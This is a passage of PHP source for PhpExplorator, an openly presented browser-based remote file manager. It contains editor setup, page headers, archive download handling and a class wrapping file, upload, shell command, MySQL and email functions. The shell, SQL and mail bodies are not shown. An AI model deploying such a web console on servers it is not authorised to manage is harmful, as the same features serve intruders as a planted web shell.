 <fieldset class="bubble"><legend><?php print($PE_thevar["PE_current_file"]);?></legend>
        <table class="num0"   width="100%">
         <tr><td align="center">

         <textarea  rows="10" name="PE_normal_textarea" id="PE_normal_textarea"  cols="120">
         </textarea>
         <br />
         <input type="hidden" name="PE_select_action" value="save" />
        <?php PE_stream_select($PE_config, $PE_thevar);?>

         <input type="submit" value="<?php print(PE_translate("save_to_file"));

            ?>" />:
         <input type="text" name="PE_the_file" value="<?php print($PE_thevar["PE_current_file"]);

            ?>" />
         </td>
         </tr>
        </table>
        </fieldset>
        </form>


            <?php

        }





    return $PE_config;
}
/**
* PE_header_mce()
* send mce headers to the browser
*
* @param mixed $PE_config
* @param mixed $PE_thevar
* @param array $PE_language
* @param string $PE_mce_conf
* @return
*/

function PE_header_mce($PE_config, $PE_mce_conf = "")
{
    if(empty($PE_config["use_extend_editor"])) return $PE_config;

    print("<link href=\"" . $PE_config["tinymce_path"] . "tinymce/docs/css/screen.css\" rel=\"stylesheet\" type=\"text/css\" />");
    // ===================================
    if(!empty($PE_config["editor_compression"])){
        if($PE_config["editor_compression_language"] == "php"){
            print("<script language=\"javascript\" type=\"text/javascript\" src=\"" . $PE_config["tinymce_php_file"] . "\"></script>");
        } elseif($PE_config["editor_compression_language"] == "jsp"){
            print("<script language=\"javascript\" type=\"text/javascript\" src=\"" . $PE_config["tinymce_jsp_file"] . "\"></script>");
        } elseif($PE_config["editor_compression_language"] == "aspx"){
            print("<script language=\"javascript\" type=\"text/javascript\" src=\"" . $PE_config["tinymce_aspx_file"] . "\"></script>");
        } elseif($PE_config["editor_compression_language"] == "cfm"){
            print("<script language=\"javascript\" type=\"text/javascript\" src=\"" . $PE_config["tinymce_cfm_file"] . "\"></script>");
        }else{
            print("<script language=\"javascript\" type=\"text/javascript\" src=\"" . $PE_config["tinymce_js_file"] . "\"></script>");
        }

        ?>
             <script language="javascript" type="text/javascript">
            tinyMCE_GZ.init({
                plugins : "advhr, advimage, advlink, autosave, cleanup, contextmenu, devkit, directionalit, emotions, fullpage, fullscreen, iespell, inlinepopups, insertdatetim, layer, media, nonbreaking, noneditable, paste, preview, print, save, searchreplace, style, table, visualchars, xhtmlxtras, zoom",
                themes : 'simple,advanced',
                languages : 'en',
                disk_cache : true,
                debug : false
            });
            </script>
<?php
        // ===================================
    }else{
        print("<script language=\"javascript\" type=\"text/javascript\" src=\"" . $PE_config["tinymce_path"] . "tinymce/jscripts/tiny_mce/tiny_mce.js\"></script>");
    }
    // ===================================
    ?>
<script language="javascript" type="text/javascript">
tinyMCE.init({
<?php
    // ===================================
    if($PE_mce_conf){
        print($PE_mce_conf);
    }else{
        // ===================================

        ?>

//     mode : "textareas",
//     mode : "specific_textareas",

    mode : "exact",
    elements : "PE_mce_textarea",
    theme : "advanced",

    editor_selector : "mceEditor",
//      editor_deselector : "mceNoEditor",

    width : "90%",
    height : "600",

    preformatted : true,
    remove_linebreaks : false,

    apply_source_formatting : true,
    nonbreaking_force_tab : true,
    fix_list_elements : true,
    fix_table_elements : true,
    language : "en",
    add_form_submit_trigger : false,

    save_callback : "TinyMCE_Save",
    onchange_callback : "myCustomOnChangeHandler",

    convert_newlines_to_brs : true,
    plugin_preview_width : "750",
    plugin_preview_height : "550",
//     document_base_url : "http://127.0.0.1/",
    relative_urls : false,
    remove_script_host : false,
    invalid_elements : "script, applet, iframe",
    directionality: "ltr",
    force_br_newlines : "true",
    force_p_newlines : "true",


    debug : false,
    cleanup : true,
    cleanup_on_startup : true,
    safari_warning : false,
    plugins : "advhr, advimage, advlink, autosave, cleanup, contextmenu, devkit, directionalit, emotions, fullpage, fullscreen, iespell, inlinepopups, insertdatetim, layer, media, nonbreaking, noneditable, paste, preview, print, save, searchreplace, style, table, visualchars, xhtmlxtras, zoom",
//  themes : "simple,advanced",
    theme_advanced_buttons1_add_before : "save,newdocument,separator",
    theme_advanced_buttons1_add : "fontselect,fontsizeselect",
    theme_advanced_buttons2_add : "separator,insertdate,inserttime,preview,separator,forecolor,backcolor,advsearchreplace",
    theme_advanced_buttons2_add_before: "cut,copy,paste,pastetext,pasteword,separator,search,replace,separator",
    theme_advanced_buttons3_add_before : "tablecontrols,separator",
    theme_advanced_buttons3_add : "emotions,iespell,media,advhr,separator,print,separator,ltr,rtl,separator,fullscreen",
    theme_advanced_buttons4 : "insertlayer,moveforward,movebackward,absolute,|,styleprops,|,cite,abbr,acronym,del,ins,|,nonbreaking",
    theme_advanced_buttons3_add : "spellchecker",
    spellchecker_languages : "+English=en,Swedish=sv",
    theme_advanced_toolbar_location : "top",
    theme_advanced_toolbar_align : "left",
    theme_advanced_path_location : "bottom",
    content_css : "example_full.css",
    plugin_insertdate_dateFormat : "%Y-%m-%d",
    plugin_insertdate_timeFormat : "%H:%M:%S",
    extended_valid_elements : "hr[class|width|size|noshade],font[face|size|color|style],span[class|align|style]",
    external_link_list_url : "example_link_list.js",
    external_image_list_url : "example_image_list.js",
    flash_external_list_url : "example_flash_list.js",
    media_external_list_url : "example_media_list.js",
    file_browser_callback : "fileBrowserCallBack",
    theme_advanced_resize_horizontal : false,
    theme_advanced_resizing : true,

    fullpage_fontsizes : "13px,14px,15px,18pt,xx-large",
    fullpage_default_xml_pi : true,
    fullpage_default_langcode : "en",
    fullpage_default_title : "PhpExplorator TinyMce Editor",

    custom_undo_redo : true,
    custom_undo_redo_levels  : -1,
    custom_undo_redo_keyboard_shortcuts  : true,
    custom_undo_redo_restore_selection   : true,
    custom_undo_redo_global  : true,

    verify_html  : true,
    inline_styles    : true,
    auto_reset_designmode : true,

         fullscreen_settings : {
             mceInsertLayer  : true,
             theme_advanced_path_location : "top"

         }
<?php
        // ===================================
    }
    // ===================================
    ?>
 }

 );
 function TinyMCE_Save(editor_id, content, node)
     {
     var vHTML = content;
     document.getElementById('PE_mce_textarea').value=vHTML;
     return vHTML;
     }

 function fileBrowserCallBack(field_name, url, type, win){
     return url;
     }

     function myCustomOnChangeHandler(inst){
     document.getElementById('text').value=inst.getBody().innerHTML;
 }
</script>
<script language="javascript" type="text/javascript">
function PE_show_id2(f,send_text,send_id1,send_id2){
     if(f.PE_select_mode.options[f.PE_select_mode.selectedIndex].value==send_text){
         PE_hide(send_id1);
         PE_show(send_id2);

         val=document.getElementById('PE_normal_textarea').value;
         tinyMCE.setContent(val);
     }else{
         PE_hide(send_id2);
         PE_show(send_id1);

         val=tinyMCE.getContent();
         document.getElementById('PE_normal_textarea').value=val;
     }

     return(false);
}

var js_message1 = '<?php print(PE_translate("js_message1"));?>';
var js_message2 = '<?php print(PE_translate("js_message2"));?>';


 function PE_confirm(act, js_message1, js_message2){
    return(confirm(js_message1 + act + js_message2));
 }





/* BEGIN SCRIPT*/
function PE_hide(elt_id){
try{
document.getElementById(elt_id).style.visibility = "hidden";
document.getElementById(elt_id).style.display = "none";
// alert("hided -> " + elt_id);
}catch(e){;}
return(false);
}
/* END SCRIPT */


/* BEGIN SCRIPT*/
function PE_show(elt_id){
try{
document.getElementById(elt_id).style.visibility = "visible";
document.getElementById(elt_id).style.display = "block";
// alert("show -> " + elt_id);
}catch(e){;}
return(false);
}
/* END SCRIPT */



 /* BEGIN SCRIPT*/
function PE_hide_group_value(elt_id, val, id_true, id_false){
select_val = document.getElementById(elt_id).options[document.getElementById(elt_id).selectedIndex].value;

var array_id_true=id_true.split(",");
var array_id_false=id_false.split(",");


if(val==''){
var result = 1;
}else{
var result = val.search(select_val);
}

// alert(result);

if(result >= 0){
		for(x in array_id_false)
		PE_hide(array_id_false[x]);
		for(x in array_id_true)
		PE_show(array_id_true[x]);
}else if(val[0]=='!'){
		for(x in array_id_false)
		PE_show(array_id_false[x]);
		for(x in array_id_true)
		PE_hide(array_id_true[x]);
}

return(false);
}
/* END SCRIPT */


/* BEGIN SCRIPT*/
function PE_check_hide(check_id, elt_id, action_type){

var to_do=(document.getElementById(check_id).checked==1);

if(action_type=="inverse") to_do=!(to_do);


if(to_do){
	show(elt_id);
}else{
	hide(elt_id);
	}


	return(false);
}
/* END SCRIPT */


</script>
 <?php
    return $PE_config;
}

/**
* PE_header_html_mce()
* send html headers to the browser
*
* @param mixed $PE_config
* @param mixed $PE_thevar
* @param array $PE_language
* @param string $PE_mce_conf
* @return
*/

function PE_header_html_mce($PE_config, $PE_thevar, $PE_language = array(), $PE_mce_conf = "")
{
    print("<?xml version=\"1.0\" encoding=\"".PE_translate("encoding")."\"?>");

    ?>
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//<?php print(strtoupper(PE_translate("language_code")));?>" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="<?php print(PE_translate("language_code"));?>" xml:lang="<?php print(PE_translate("language_code"));?>" >
 <head>
     <meta name="keywords" content="phpexplorator, remote manage, admin tools" />
     <meta name="description" content="phpexplorator is a web interface to remote edit and manage file on the server site. " />
     <meta name="author" content="tchouamou"/>
     <meta name="distribution" content="global" />

     <meta name="robots" content="all" />
     <meta name="rating" content="general" />
<?php
    // =====================================
    PE_header_mce($PE_config, $PE_mce_conf);
    // =====================================
    ?>

<title>PhpExplorator:<?php print("[" . $PE_thevar["select_action"] . "], " . $PE_thevar["the_file"]);

    ?> </title>

 </head>
 <!--end head -->

 <!--begin body -->
 <body background="" >
<?php
    return true;
}
/**
* PE_header_body()
* send begin of body to the browser
*
* @param mixed $PE_config
* @param mixed $PE_thevar
* @param array $PE_language
* @param string $PE_mce_conf
* @return
*/
function PE_header_body($PE_config, $PE_thevar, $PE_language = array())
{

    ?>
 <noscript>Java script is not activated, Activate Javascript to use better the Application.</noscript>
 <style type="text/css">
 tr.row0 {color:#000000; background-color: #EFEFEF; }
 tr.row1 {color:#000000; background-color: #DEDEDE; }
 tr.row2 {color:#000000; background-color: #DEE3E7; }

 td.num0 {color:#000000; background-color: #EFEFEF; }
 td.num1 {color:#000000; background-color: #DEDEDE; }

 table.num0 {color:#000000; background-color: #EEEEEE;}
 table.num1 {color:#000000; background-color: #EEFFEE;}
 table.num1 {color:#000000; background-color: #DEDEDE;border: solid #D1D7DC 1px; border-top-width: 2px;}
 table.num2 {color:#000000; background-color: #EEEEEE;}
 table.num3 {color:#000000; background-color: #DEDEDE;}
 table.num4 {color:#000000; background-color: #EFEFEF;}

 p.num0 {color:#000000; border: solid #555555 1px; background-color: #FFFFFF;}
 input,textarea, select {font: normal 12x Verdana, Arial, Helvetica, sans-serif;}
 </style>
 <?php
    if(!empty($PE_config["style_file"])){
        print("<link href=\"" . $PE_config["style_file"] . "\" rel=\"stylesheet\" type=\"text/css\" />");
    }

    ?>
 <script language="javascript" type="text/javascript">

 function PE_hide(elt_id){
 document.getElementById(elt_id).style.visibility = "hidden";
 document.getElementById(elt_id).style.display = "none";
 return(false);
 }

 function PE_show(elt_id){
 document.getElementById(elt_id).style.visibility = "visible";
 document.getElementById(elt_id).style.display = "block";
 return(false);
 }

 function PE_check_uncheck(f, check_id)
 {
 if(document.getElementById(check_id).checked==1){
         for (i=0; i < f.elements.length; i++){
         try{
             ele = f.elements[i].checked=1;
         }
         catch(e){;
         }
         }
     }
     else{
             for (i=0; i < f.elements.length; i++){
             try{
             ele = f.elements[i].checked=0;
             }
             catch(e){;
             }
             }
         }
 return(false);
 }

 function PE_change_mode(f){
 return(false);
 }

</script>
<?php
    return true;
}
/**
* PE_header_extra()
* Manage sending some headers to the browser (download, zip, images, ..etc)
*
* @param mixed $PE_config
* @param mixed $PE_thevar
* @param array $PE_language
* @param string $PE_mce_conf
* @return
*/
function PE_header_extra($PE_config, $PE_thevar, $PE_language = array())
{
    switch ($PE_thevar["select_action"]){
        case "download":
            if(is_dir($PE_thevar["the_file"])){
                PE_get_files($PE_config, $PE_thevar, $PE_thevar["the_file"] , "one_folder", "zip");
            }else{
                PE_get_files($PE_config, $PE_thevar, $PE_thevar["the_file"] , "one_file", "none");
            }
            exit;
            break;
        case "zip":
            $data_type = is_dir($PE_thevar["the_file"])?"one_folder":"one_file";
            PE_get_files($PE_config, $PE_thevar, $PE_thevar["the_file"] , $data_type, "zip");
            exit;
            break;
        case "gz":
            $data_type = is_dir($PE_thevar["the_file"])?"one_folder":"one_file";
            PE_get_files($PE_config, $PE_thevar, $PE_thevar["the_file"] , $data_type, "gz");
            exit;
            break;
        case "bz2":
            $data_type = is_dir($PE_thevar["the_file"])?"one_folder":"one_file";
            PE_get_files($PE_config, $PE_thevar, $PE_thevar["the_file"] , $data_type, "bz2");
            exit;
            break;
        case "send_image":
                PE_img_by_text($PE_thevar["the_file"]);
                PE_img_by_path($PE_thevar["the_file"]);
            exit;
            break;
        case "file_select":
            switch (PE_getpost('PE1_action_check')){
                case "zip_all":
                    PE_get_files($PE_config, $PE_thevar, $_POST["PE1_file_check"] , "files_folders", "zip");
                    break;
                case "gzip_all":
                    PE_get_files($PE_config, $PE_thevar, $_POST["PE1_file_check"] , "files_folders", "gz");
                    break;
                case "bz2_all":
                    PE_get_files($PE_config, $PE_thevar, $_POST["PE1_file_check"] , "files_folders", "bz2");
                    break;
                case "download_all":
                    PE_get_files($PE_config, $PE_thevar, $_POST["PE1_file_check"] , "files_folders", "zip");
                    break;
                default:
                    break;
            }
            break;
        default:
            break;
    }
    return $PE_thevar;
}

//   ___  __     __   ____  ____
//  / __)(  )   / _\ / ___)/ ___)
// ( (__ / (_/\/    \\___ \\___ \
//  \___)\____/\_/\_/(____/(____/

/**
* Class PhpExplorator
*
* @package
* @author Tchouamou Eric Herve  (tchouamou@gmail.com)
* @copyright Copyright (c) 2011
* @version $Id$
* @access public
*/

if(!(class_exists("phpexplorator"))){
class phpexplorator {
    /**
    * This property [config] content all configuration param
    */
    var $config = array();
    /**
    * This property [language] content all translated word
    */
    var $language = array();
    /**
    * This property [the_var] content send or Post var
    */
    var $the_var = array();
    /**
    * This property [mce_conf] content the string configuration of tinymce javascrip editor
    */
    var $mce_conf = "";
    /**
    * phpexplorator::phpexplorator()
    * Constructor of the class, load some default var value
    */
//00000000000000000000000000
function __construct() // --constructor--
{
   return $this->phpexplorator();
}
//00000000000000000000000000
    function phpexplorator()
    {
        $this->config = $this->load_other_config();
        if(empty($this->config["show_error"]))ini_set('error_reporting', 0);
        if(!empty($this->config["show_error"]))error_reporting (E_ALL ^ E_NOTICE);//error_reporting (E_ERROR | E_WARNING | E_PARSE);
        $this->the_var = $this->get_var($this->config);
        $this->mce_conf = $this->load_other_config("mce");

        return true;
    }

    /**
    * phpexplorator::action()
    * Simplely call the function PE_action() and return his value.
    *
    * @return
    */
    function action()
    {
        return PE_action($this->config, $this->the_var, $this->language);
    }
    /**
    * phpexplorator::auth_basic()
    * Simplely call the function PE_auth_basic() and return his value.
    *
    * @return
    */
    function auth_basic()
    {
        return PE_auth_basic($_SERVER["PHP_SELF"]);
    }
    /**
    * phpexplorator::auth_form()
    * Simplely call the function PE_auth_form() and return his value.
    *
    * @return
    */
    function auth_form()
    {
        return PE_auth_form($_SERVER["PHP_SELF"], $this->config, $this->language);
    }
    /**
    * phpexplorator::conv_group()
    * Simplely call the function PE_conv_group() and return his value.
    *
    * @param mixed $group
    * @return
    */
    function conv_group($group)
    {
        return PE_conv_group($group);
    }
    /**
    * phpexplorator::conv_owner()
    * Simplely call the function PE_conv_owner() and return his value.
    *
    * @param mixed $owner
    * @return
    */
    function conv_owner($owner)
    {
        return PE_conv_owner($owner);
    }
    /**
    * phpexplorator::conv_perm()
    * Simplely call the function PE_conv_perm() and return his value.
    *
    * @param mixed $perm
    * @return
    */
    function conv_perm($perm)
    {
        return PE_conv_perm($perm);
    }
    /**
    * phpexplorator::command_1()
    * Simplely call the function PE_command_1() and return his value.
    *
    * @return
    */
    function command_1()
    {
        return PE_command_1($this->config, $this->the_var, $this->language);
    }
    /**
    * phpexplorator::command_2()
    * Simplely call the function PE_command_2() and return his value.
    *
    * @return
    */
    function command_2()
    {
        return PE_command_2($this->config, $this->the_var, $this->language);
    }
    /**
    * phpexplorator::command()
    * Simplely call the function PE_command() and return his value.
    *
    * @return
    */
    function command($array_files)
    {
        return PE_command($array_files, $this->config, $this->the_var, $this->language);
    }
    /**
    * phpexplorator::command_extend()
    * Simplely call the function command_extend() and return his value.
    *
    * @return
    */
    function command_extend()
    {
        return PE_command_extend($this->config, $this->the_var, $this->language);
    }
    /**
    * phpexplorator::command_upload()
    * Simplely call the function PE_command_upload() and return his value.
    *
    * @return
    */
    function command_upload()
    {
        return PE_command_upload($this->config, $this->the_var, $this->language);
    }
    /**
    * phpexplorator::PE_copy()
    * Simplely call the function PE_copy() and return his value.
    *
    * @param mixed $source
    * @param mixed $dest
    * @return
    */
    function PE_copy($source, $dest)
    {
        return PE_copy($source, $dest);
    }
    /**
    * phpexplorator::dir_copy()
    * Simplely call the function PE_dir_copy() and return his value.
    *
    * @param mixed $source
    * @param mixed $dest
    * @return
    */
    function dir_copy($source, $dest)
    {
        return PE_dir_copy($this->config, $source, $dest);
    }
    /**
    * phpexplorator::dir_list()
    * Simplely call the function PE_dir_list() and return his value.
    *
    * @return
    */
    function dir_list()
    {
        return PE_dir_list($this->config, $this->the_var, $this->language);
    }
    /**
    * phpexplorator::dir_move()
    * Simplely call the function PE_dir_move() and return his value.
    *
    * @param mixed $source
    * @param mixed $dest
    * @return
    */
    function dir_move($source, $dest)
    {
        return PE_dir_move($this->config, $source, $dest);
    }
    /**
    * phpexplorator::dir_remove()
    * Simplely call the function PE_dir_remove() and return his value.
    *
    * @param mixed $source_dir
    * @return
    */
    function dir_remove($source_dir)
    {
        return PE_dir_remove($this->config, $source_dir);
    }
    /**
    * phpexplorator::get_files()
    * Simplely call the function PE_get_files() and return his value.
    *
    * @param mixed $input_data
    * @param string $input_type
    * @param string $compress_methop
    * @return
    */
    function get_files($input_data , $input_type = "one_file", $compress_methop = "txt")
    {
        return PE_get_files($this->config, $this->the_var, $input_data , $input_type, $compress_methop);
    }
    /**
    * phpexplorator::export()
    * Simplely call the function PE_export() and return his value.
    *
    * @param string $stream_data
    * @param string $final_name
    * @param string $file_extention
    * @return
    */
    function export($stream_data = "", $final_name = "", $file_extention = "txt")
    {
        return PE_export($stream_data, $final_name, $file_extention);
    }
    /**
    * phpexplorator::footer()
    * Simplely call the function PE_footer() and return his value.
    *
    * @return
    */
    function footer()
    {
        return PE_footer($this->config, $this->language);
    }
    /**
    * phpexplorator::form()
    * Simplely call the function PE_form($PE_config, ) and return his value.
    *
    * @param string $val_submit
    * @param string $val_type1
    * @param string $val_name1
    * @param string $val_value1
    * @param string $val_type2
    * @param string $val_name2
    * @param string $val_value2
    * @param string $val_type3
    * @param string $val_name3
    * @param string $val_value3
    * @return
    */
    function form($val_submit = "Go", $val_type1 = "text", $val_name1 = "PE_the_file", $val_value1 = "./", $val_type2 = "text", $val_name2 = "PE_the_value", $val_value2 = "./", $val_type3 = "", $val_name3 = "", $val_value3 = "")
    {
        return PE_form($PE_config, $val_submit, $val_type1 , $val_name1, $val_value1, $val_type2, $val_name2, $val_value2, $val_type3, $val_name3, $val_value3);
    }
    /**
    * phpexplorator::format_date_time()
    * Simplely call the function PE_format_date_time() and return his value.
    *
    * @param mixed $date_time
    * @return
    */
    function format_date_time($date_time)
    {
        return PE_format_date_time($this->config, $date_time);
    }
    /**
    * phpexplorator::format_filesize()
    * Simplely call the function PE_format_filesize() and return his value.
    *
    * @param mixed $filesize
    * @return
    */
    function format_filesize($filesize)
    {
        return PE_format_filesize($filesize);
    }
    /**
    * phpexplorator::get_var()
    * Simplely call the function PE_get_var() and return his value.
    *
    * @return
    */
    function get_var()
    {
        return PE_get_var($this->config);
    }
    /**
    * phpexplorator::getdir_all()
    * Simplely call the function PE_get_var() and return his value.
    *
    * @param mixed $array_path
    * @param string $only_property
    * @return
    */
    function getdir_all($array_path, $only_property = "")
    {
        return PE_getdir_all($this->config, $array_path, $only_property);
    }
    /**
    * phpexplorator::getpost()
    * Simplely call the function PE_getpost() and return his value.
    *
    * @param mixed $value
    * @return
    */
    function getpost($value)
    {
        return PE_getpost($value);
    }
    /**
    * phpexplorator::head_dir()
    * Simplely call the function PE_head_dir() and return his value.
    *
    * @return
    */
    function head_dir()
    {
        return PE_head_dir($this->config, $this->the_var, $this->language);
    }
    /**
    * phpexplorator::PE_header_extra()
    * Simplely call the function PE_header_extra() and return his value.
    *
    * @return
    */
    function header_extra()
    {
        return PE_header_extra($this->config, $this->the_var, $this->language);
    }
    /**
    * phpexplorator::PE_header_body()
    * Simplely call the function PE_header_body() and return his value.
    *
    * @return
    */
    function header_body()
    {
        return PE_header_body($this->config, $this->the_var, $this->language);
    }
    /**
    * phpexplorator::header_html_mce()
    * Simplely call the function PE_header_html_mce() and return his value.
    *
    * @return
    */
    function header_html_mce()
    {
        return PE_header_html_mce($this->config, $this->the_var, $this->language, $this->mce_conf);
    }
    /**
    * phpexplorator::header_mce()
    * Simplely call the function PE_header_mce() and return his value.
    *
    * @return
    */
    function header_mce()
    {
        return PE_header_mce($this->config, $this->mce_conf);
    }
    /**
    * phpexplorator::icon_src()
    * Simplely call the function PE_icon_src() and return his value.
    *
    * @param mixed $icon_src
    * @return
    */
    function icon_src($icon_src)
    {
        return PE_icon_src($PE_config, $icon_src);
    }
    /**
    * phpexplorator::img_by_path()
    * Simplely call the function PE_img_by_path() and return his value.
    *
    * @param mixed $imgpath
    * @return
    */
    function img_by_path($imgpath)
    {
        if($this->config["self_header"]){
            return PE_img_by_path($imgpath);
        }else{
            return $imgpath;
        }
    }
    /**
    * phpexplorator::img_by_text()
    * Simplely call the function PE_img_by_text() and return his value.
    *
    * @param mixed $imgtext
    * @return
    */
    function img_by_text($imgtext)
    {
        if($this->config["self_header"]){
            return PE_img_by_text($imgtext);
        }else{
            return $imgtext;
        }
    }
    /**
    * phpexplorator::is_include_dir()
    * Simplely call the function PE_is_include_dir() and return his value.
    *
    * @param string $the_file_value
    * @param string $the_pure_dir
    * @return
    */
    function is_include_dir($the_file_value = "", $the_pure_dir = "")
    {
        return PE_is_include_dir($the_file_value, $the_pure_dir);
    }
    /**
    * phpexplorator::is_windows()
    * Simplely call the function PE_is_windows() and return his value.
    *
    * @return
    */
    function is_windows()
    {
        return PE_is_windows();
    }
    /**
    * phpexplorator::load_other_config()
    * Simplely call the function PE_load_other_config() and return his value.
    *
    * @param string $conf_type
    * @return
    */
    function load_other_config($conf_type = "")
    {
        return PE_load_other_config($conf_type);
    }
    /**
    * phpexplorator::load_lang()
    * Simplely call the function PE_load_lang() and return his value.
    *
    * @return
    */
    function load_lang()
    {
        return PE_load_lang($this->config);
    }
    /**
    * phpexplorator::login()
    * Simplely call the function PE_login() and return his value.
    *
    * @return
    */
    function login()
    {
        return PE_login($this->config, $this->language);
    }
    /**
    * phpexplorator::mime_type()
    * Simplely call the function PE_mime_type() and return his value.
    *
    * @param mixed $file_ext
    * @return
    */
    function mime_type($file_ext)
    {
        return PE_mime_type($file_ext);
    }
    /**
    * phpexplorator::path_separator()
    * Simplely call the function PE_path_separator() and return his value.
    *
    * @return
    */
    function path_separator()
    {
        return PE_path_separator();
    }
    /**
    * PE_print_r()
    * Simplely call the function PE_print_r() and return his value.
    *
    * @param mixed $info
    * @return
    */
    function PE_print_r($info)
    {
        return PE_print_r($info);
    }
    /**
    * pure_uri()
    * Simplely call the function realpath() and return his value.
    *
    * @param mixed $the_adress
    * @return
    */
    function pure_uri($the_adress)
    {
        return realpath($the_adress);
    }

    /**
    * replace()
    * Simplely call the function PE_replace() and return his value.
    *
    * @return
    */
    function replace()
    {
        return PE_replace($this->config, $this->the_var, $this->language);
    }

    /**
    * email()
    * Simplely call the function PE_email() and return his value.
    *
    * @return
    */
    function email()
    {
        return PE_email($this->config, $this->the_var, $this->language);
    }

    /**
    * mysql()
    * Simplely call the function PE_mysql() and return his value.
    *
    * @return
    */
    function mysql()
    {
        return PE_mysql($this->config, $this->the_var, $this->language);
    }

    /**
    * shell()
    * Simplely call the function PE_shell() and return his value.
    *
    * @return
    */
    function shell()
    {
        return PE_shell($this->config, $this->the_var, $this->language);
    }



    /**
    * title()
    * Simplely call the function PE_title()
    *
    * @return
    */

    function title()
    {
        return PE_title($this->config, $this->language);
    }
    /**
    * load_stream()
    * Simplely call the function PE_load_stream()
    *
    * @return
    */
    function load_stream()
    {
        return PE_load_stream($this->config, $_SESSION["PE_current_stream"]);
    }
    /**
    * zipfiles()
    * Simplely call the function PE_zipfiles() and return his value.
    *
    * @param mixed $array_files_dirs_to_zip
    * @param mixed $parent_dir_all_files
    * @param string $file_name_encoding
    * @return
    */
    function zipfiles($array_files_dirs_to_zip, $parent_dir_all_files, $file_name_encoding = "UTF-8")
    {
        return PE_zipfiles($array_files_dirs_to_zip, $parent_dir_all_files, $file_name_encoding);
    }
    /**
    * show()
    * Usefull to run phpexplorator by loading a set of function already declare in the class
    *
    * @return
    */


    /**
    *
    * @return
    */
	function get_config($param="")
	{
		return $this->config[$param];
	} // function to get the config  value of the key ($param).
    /**
    *
    * @return
    */
	function get_the_var($param="")
	{
		return $this->the_var[$param];
	} // function to get the the_var  value of the key ($param).
    /**
    *
    * @return
    */
	function get_mce_conf()
	{
		return $this->mce_conf;
	} // function to get the mce_conf  value .
    /**
    *
    * @return
    */
	function get_language($param="")
	{
		return $this->language[$param];
	} // function to get the language  value of the key ($param).



    /**
    *
    * @return
    */
	function set_config($param, $value="")
	{
		return ($this->config[$param] = $value);
	} // function to set $this->config[$param] with the value ($value).
    /**
    *
    * @return
    */
	function set_the_var($param, $value="")
	{
		return ($this->the_var[$param] = $value);
	} // function to set $this->the_var[$param] with the value ($value).
    /**
    *
    * @return
    */
	function set_mce_conf($value="")
	{
		return ($this->mce_conf=$value);
	} // function to set $this->mce_conf with the value ($value).
    /**
    *
    * @return
    */
	function set_language($param, $value="")
	{
		return ($this->language[$param] = $value);
	} // function to set $this->language[$param] with the value ($value).


    function show()
    {

        if($this->config["self_header"]){
            $this->img_by_text($this->getpost("PE_imgtext"));
            $this->img_by_path($this->getpost("PE_imgpath"));
        }



        if($this->login()){
            $this->language = $this->load_lang($this->config);
            $this->config = $this->load_stream();
            $this->header_extra();
            if($this->config["self_header"])$this->header_html_mce();
            $this->header_body();

            $this->title();
            $this->config = $this->action();
            $this->head_dir();
            $this->dir_list();
            print("<br />");
            $this->command_1();
            print("<br />");
            $this->command_2();
            print("<br />");
            $this->command_upload();
            print("<br />");
            $this->command_extend();
            print("<br />");
            $this->shell();
            print("<br />");
            $this->replace();
            print("<br />");
            $this->email();
            print("<br />");
            $this->mysql();
        }
        print("<br />");
        if($this->config["self_header"]) $this->footer();
        return true;
    }
}
}


//
//  _  _   __   __  __ _
// ( \/ ) / _\ (  )(  ( \
// / \/ \/    \ )( /    /
// \_)(_/\_/\_/(__)\_)__)
//
//  Main phpexplorator
//

// set_magic_quotes_runtime(0);
// $p1 = new phpexplorator();
// $p1->show();

?>
